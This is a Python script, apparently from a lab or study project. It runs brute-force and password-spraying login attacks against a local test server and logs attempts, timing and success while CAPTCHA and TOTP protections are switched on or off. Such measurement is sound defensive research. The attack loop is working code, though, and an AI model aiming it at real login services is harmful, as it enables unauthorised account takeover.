import requests
import json
import time
import os
import pyotp
from datetime import datetime
import itertools

SERVER_URL = "http://127.0.0.1:5000"
ATTACK_ENDPOINT = f"{SERVER_URL}/login"

with open("data/users.json", "r") as f:
    passwords_data = json.load(f)

WEAK_PASSWORDS = passwords_data["weak_passwords"]
MEDIUM_PASSWORDS = passwords_data["medium_passwords"]
STRONG_PASSWORDS = passwords_data["strong_passwords"]
POTENTIAL_PASSWORDS = (
    WEAK_PASSWORDS + MEDIUM_PASSWORDS + STRONG_PASSWORDS
)

try:
    with open("data/registered_users_data.json", "r") as f:
        registered_data = json.load(f)
        REGISTERED_USERS_MAP = {user['username']: user for user in registered_data['users']}
except FileNotFoundError:
    REGISTERED_USERS_MAP = {}

def get_captcha_token(protection_flags):
    if len(protection_flags) > 3 and protection_flags[3] == '1':
         try:
             captcha_response = requests.get(f"{SERVER_URL}/admin/get_captcha_token")
             return captcha_response.json().get("captcha_token")
         except Exception:
             return None
    return None

def verify_totp(username, password, captcha_token):
    user_secret = REGISTERED_USERS_MAP.get(username, {}).get("totp_secret")
    if not user_secret:
        return False
        
    totp_code = pyotp.TOTP(user_secret).now()
    
    totp_payload = {
        "username": username,
        "password": password,
        "otp": totp_code,
        "captcha_token": captcha_token
    }
    totp_response = requests.post(f"{SERVER_URL}/login_totp", json=totp_payload)

    return totp_response.status_code == 200

def run_attack(attack_type, targets_data, password_list, protection_flags):
    
    target_users = [t['username'] for t in targets_data]
    if attack_type == "Brute-Force":
        hash_mode = targets_data[0]['hash_mode'] if targets_data else "unknown"
    else:
        hash_mode = "Mixed/Multiple"
    
    print(f"\n--- Starting {attack_type} Attack ---")
    print(f"Target Users: {', '.join(target_users)}, Hash Mode: {hash_mode}, Protections: {protection_flags}")
    
    start_time = time.time()
    attempts = 0
    success_time = None
    success_found = False

    if attack_type == "Brute-Force":
        target_username = targets_data[0]['username']
        attack_sequence = [(target_username, password_to_try) for password_to_try in password_list]
    else:
        attack_sequence = [(user['username'], password_to_try) 
                            for password_to_try in password_list 
                            for user in targets_data]


    for username, password in attack_sequence:
        attempts += 1
        
        captcha_token = get_captcha_token(protection_flags)
        payload = {
            "username": username,
            "password": password,
            "captcha_token": captcha_token
        }
        
        try:
            response = requests.post(ATTACK_ENDPOINT, json=payload)
            response_data = response.json()
            
            if response.status_code == 200:
                
                if response_data.get("totp_required") and len(protection_flags) > 4 and protection_flags[4] == '1':
                    
                    if verify_totp(username, password, captcha_token):
                        print(f"!!! SUCCESS !!! Password Found: '{password}' for {username} (TOTP Verified)")
                        success_time = time.time()
                        success_found = True
                        break
                    else:
                        pass
                
                else:
                    print(f"!!! SUCCESS !!! Password Found: '{password}' for {username}")
                    success_time = time.time()
                    success_found = True
                    break
            
            elif response.status_code in [401, 403, 429]:
                 pass
            
            else:
                 pass

        except requests.exceptions.RequestException as e:
            print(f"Request Error on attempt {attempts}: {e}")
            break

    end_time = time.time()
    
    total_time = end_time - start_time
    time_to_first_success = success_time - start_time if success_time else None
    attempts_per_second = attempts / total_time if total_time > 0 else 0
    
    time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    result_log = {
        "timestamp_readable": time_str,
        "attack_type": attack_type,
        "targets": target_users,
        "hash_mode": hash_mode,
        "protections_active": protection_flags,
        "total_attempts": attempts,
        "time_to_completion_s": f"{total_time:.4f} s",
        "time_to_first_success_s": f"{time_to_first_success:.4f} s" if time_to_first_success is not None else "N/A",
        "attempts_per_second": f"{attempts_per_second:.2f}",
        "success_status": "Success" if success_found else "Failed to find (or Blocked)"
    }
    
    return result_log